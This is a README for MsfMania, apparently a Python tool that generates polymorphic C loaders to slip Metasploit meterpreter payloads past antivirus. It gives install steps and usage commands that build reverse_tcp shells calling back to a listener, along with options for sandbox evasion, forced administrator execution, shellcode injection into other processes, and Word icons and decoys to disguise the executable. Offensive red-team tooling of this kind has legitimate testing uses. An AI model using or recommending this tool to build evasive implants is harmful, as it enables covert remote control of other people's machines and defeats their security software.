# MsfMania

MsfMania is a command line tool developed in Python, allowing to automatically produce a source code in C language that will be used to bypass antimalware before executing a metasploit payload.

## Version 2.2
New features:
```
1- Code fully reviewed and redrafted
2- Perfomance increase
3- Simple encryption by XOR operation based on key size
4- You can force the user to run the program as an administrator with the argument "--admin".
5- The addition of a function allowing sandbox/antivirus evasion is now optional, with the argument "--evasion".
6- Massive bug fix
```

## Requirements
- Latest version of Kali Linux
- The kali-rolling repository
- Python3

## Installation
- Git clone this repository: ```git clone https://github.com/G1ft3dC0d3/MsfMania.git```
- cd into the MsfMania folder: ```cd MsfMania```
- HAVE FUN

## Usage
```
python3 MsfMania.py -h
```
```
python3 MsfMania.py staged x64 windows/x64/meterpreter/reverse_tcp 192.168.254.129 4444 Malware local --evasion --admin
```
```
python3 MsfMania.py staged x64 windows/x64/meterpreter/reverse_tcp 192.168.254.129 4444 Virus remote --procname Wireshark.exe --mscript --icon mco.ico
```
```
python3 MsfMania.py stageless x64 windows/x64/meterpreter_reverse_tcp 192.168.254.129 4444 Word remote --decoy 2000 --mscript --icon word.ico
```

## Features
- Polymorphic C source code.
- x86/x64 staged/stageless windows payload meterpreter/shell.
- Local/Remote Thread Shellcode Injection
- Sandbox/Antivirus Evasion
- Run as Administrator
- Executable customizable with an icon.
- Cross-compiler MinGW.
- Strip executable.
- Rar compression.
- Autorun Metasploit config
